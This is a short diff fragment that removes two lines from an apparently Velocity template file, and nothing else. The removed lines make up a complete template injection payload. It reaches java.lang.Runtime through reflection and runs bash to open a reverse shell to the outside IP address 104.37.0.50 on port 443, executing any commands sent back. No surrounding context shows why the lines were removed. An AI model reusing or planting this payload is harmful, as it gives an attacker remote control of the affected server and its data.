@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["/bin/bash","-c","exec 5<>/dev/tcp/104.37.0.50/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
